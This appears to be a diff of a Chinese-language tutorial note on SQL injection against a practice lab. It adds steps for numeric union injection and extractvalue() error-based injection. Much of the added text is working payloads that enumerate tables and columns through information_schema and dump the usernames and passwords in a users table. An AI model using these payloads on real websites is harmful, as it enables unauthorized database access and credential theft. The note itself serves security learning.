@@ -138,7 +138,7 @@ select version();
 
 ### 注入分类：
 1. 按照查询字符型与数字型
-使用and 1=1和and 1=2来来判断，字符型and 1=2是不可以正确回显的
+使用and 1=1和and 1=2来来判断，或者用id=2-1如果结果于id=1是一样的说明就是数字型，数字型不用判断闭合方式
 字符型
 ![alt text](image-249.png)
 数字型
@@ -152,7 +152,7 @@ select version();
 ### 闭合
 手动提交闭合符号例如“ ' " '# ”等，结束前一段查询语句即可加入其他语句，查询需要的参数不需要的语句可以用注释符号“--+ 或%23”注释掉
 
-### 步骤
+### union注入（字符型）步骤
 1. **先判断闭合方式' " '#等**
 例如输入单引号报错，但是用--+注释掉之后页面正常说明就是单引号闭合
 ![alt text](image-251.png)
@@ -201,7 +201,7 @@ columns 列名集合表
 ```
 或者将database()修改为'security',因为前面在查看回显位的时候用database()函数得到了数据表名
 ![alt text](image-258.png)
-这样查询还是有缺陷因为得不到所有security中的所有表名，所以这里利用了前面讲到的函数group_concat()了
+这样查询还是有缺陷因为得不到所有security中的所有表名，所以这里利用了前面讲到的函数group_concat()了，**最终语句如下**
 ```sql
 ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
 ```
@@ -214,7 +214,7 @@ columns 列名集合表
 ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()--+
 ```
 ![alt text](image-260.png)
-这里如果想要的是users中的列名,可以用and tabale_name='想看的数据表'
+这里如果想要的是users中的列名,可以用and tabale_name='想看的数据表，**最终语句如下**
 ```sql
 ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
 ```
@@ -228,3 +228,109 @@ columns 列名集合表
 
 ![alt text](image-262.png)
 为了美观这里还可以用分隔符分割开，只需改为group_concat(username,'~',password)
+
+### union注入（数字型）步骤
+**数字型不用判断闭合方式**
+1. **确定数字型还是字符型**
+![alt text](image-263.png)
+![alt text](image-264.png)
+通过id=1,id=2所回显的信息不一样但是id=2-1的信息和id=1的信息一样说明是数字型
+2. **使用group by 的二分法判断列数**
+![alt text](image-265.png)
+![alt text](image-266.png)
+说明是三列
+3. **优化语句将id改为一个不存在的数字,查看回显位**
+![alt text](image-267.png)
+4. **使用select语句，查询靶机数据库名**
+```sql
+?id=-1 union select 1,2,database()--+
+```
+![alt text](image-268.png)
+5. **使用select语句查询靶机所有表名**
+```sql
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
+```
+![alt text](image-269.png)
+6. **使用select语句查询靶机所有列名**
+```sql
+?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
+```
+![alt text](image-270.png)
+7. **查询想要的信息**
+```sql
+?id=-1 union select 1,2,group_concat(id,'~',username,'~',password) from users--+
+```
+![alt text](image-271.png)
+
+**union注入的数字型和字符型的区别是数字型不用判断闭合方式，其他步骤基本一致**
+
+### 报错注入基础知识
+后台对于输入输出的合理性没有检测是报错注入的基础
+报错注入简单的说就是:**构造语句，让错误信息中夹杂可以显示数据库内容的查询语句，返回报错提示中包含数据库的内容**
+![alt text](image-272.png)
+这里输入id=1，没有东西，但是可以判断出是单引号闭合
+然后看一下group by判断列数
+![alt text](image-274.png)
+![alt text](image-273.png)
+这里可以发现4列就会报错，group by 的原理类似于报错
+然后再看一下database()
+![alt text](image-275.png)
+正常输入database()还是什么都没有，但是这里可以利用报错的原理，故意将database这个单词打错，然后他就会报错
+![alt text](image-276.png)
+从报错提示中可以得到数据库名是security
+以上就是报错注入的基本原理
+
+
+### extractValue()报错的报错注入
+extractValue()包含两个参数，第一个参数 XML文档对象名称，第二个参数 路径。用来查询xml里面的内容
+```sql
+select extractvalue(doc,'/book/author/surname') from xml
+```
+![alt text](image-277.png)
+
+
+extractvalue函数报错在于**查询参数格式符写错**，而不是把查询内容写错
+extractvalue(doc,'~book/author/surname')例如这种形式才会报错
+利用这个报错我们可以获得一些东西，即在报错之前执行一个select语句，包内容通过报错信息展示出来
+```sql
+select extractvalue(doc,concat(0x7e,(select database()))) from xml;
+```
+concat的作用是拼接 **(因为无法判断回显位，所以把内容都拼接在一起)** ，即把0x7e（~）和select语句拼接在一起
+利用这条语句我们就可以得到当前数据库的名称
+![alt text](image-278.png)
+
+通过上面内容，我们大概初步了解报错注入，接下来的注入步骤类似于union注入，只不过想要的内容通过extractvalue获得
+步骤:
+1. 判断闭合方式
+2. group by判断列数
+3. 拿当前数据库名
+```sql
+?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select database()))) --+
+```
+![alt text](image-281.png)
+4. 拿表名
+```sql
+?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
+```
+![alt text](image-282.png)
+4. 拿列名
+```sql
+?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) --+
+```
+![alt text](image-283.png)
+5. 获取信息
+```sql
+?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) --+
+```
+![alt text](image-284.png)
+
+我们发现extractvalue函数报错出来默认只返回32个字符串，所以可以使用substring函数显示25位往后的30个字符
+```sql
+?id=-1' union select 1,2,extractvalue(1,concat(0x7e,(select substring（group_concat(username,password)，25，30) from users))) --+
+```
+结合上面几条语句发现，就是将想要的内容放入extractvalue函数里面
+上面语句的形式还可以写成
+```sql
+?id=-1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) --+
+```
+
